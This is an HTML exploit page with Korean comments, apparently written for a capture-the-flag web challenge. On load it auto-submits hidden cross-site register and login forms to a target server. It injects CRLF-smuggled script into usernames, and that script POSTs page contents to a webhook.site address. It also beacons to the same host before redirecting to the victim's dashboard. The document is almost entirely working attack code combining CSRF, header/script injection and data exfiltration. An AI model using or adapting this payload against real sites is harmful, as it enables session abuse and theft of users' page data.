<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Loading...</title></head>
<body>
<h1>Loading...</h1>
<iframe name="f" style="display:none;" id="loginFrame"></iframe>
<script>
// 전략:
// 1. CRLF 계정 등록 (즉시)
// 2. 2초 후: 가능한 FLAG로 로그인 시도
// 3. 3초 후: dashboard로 redirect

var payload = "\r\n\r\n<html><script>setTimeout(function(){fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316',{method:'POST',body:document.body.innerHTML})},500)</s"+"cript></html>";

var flags = ['ctf{bookmarks}','ctf{crlf}','ctf{admin}','ctf{xss}','ctf{bot}','ctf{csrf}'];

// 1. 즉시 CRLF 계정 등록
flags.forEach(function(f, i) {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://65.109.202.184/register';
    form.target = 'f';
    
    var u = document.createElement('input');
    u.name = 'username';
    u.value = f + payload;
    
    var p = document.createElement('input');
    p.name = 'password';
    p.value = 'password';
    
    form.appendChild(u);
    form.appendChild(p);
    document.body.appendChild(form);
    form.submit();
});

// 2. 2초 후: 각 FLAG로 로그인 시도 (하나는 성공할 것)
setTimeout(function() {
    flags.forEach(function(f, i) {
        setTimeout(function() {
            var loginForm = document.createElement('form');
            loginForm.method = 'POST';
            loginForm.action = 'http://65.109.202.184/login';
            loginForm.target = 'f';
            
            var u = document.createElement('input');
            u.name = 'username';
            u.value = f;
            
            var p = document.createElement('input');
            p.name = 'password';
            p.value = 'password';
            
            loginForm.appendChild(u);
            loginForm.appendChild(p);
            document.body.appendChild(loginForm);
            loginForm.submit();
        }, i * 100);
    });
}, 2000);

// 3. 4초 후: dashboard로 redirect
setTimeout(function() {
    navigator.sendBeacon('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', 'nav_to_dashboard');
    window.location.href = 'http://65.109.202.184/dashboard';
}, 4000);
</script>
</body>
</html>
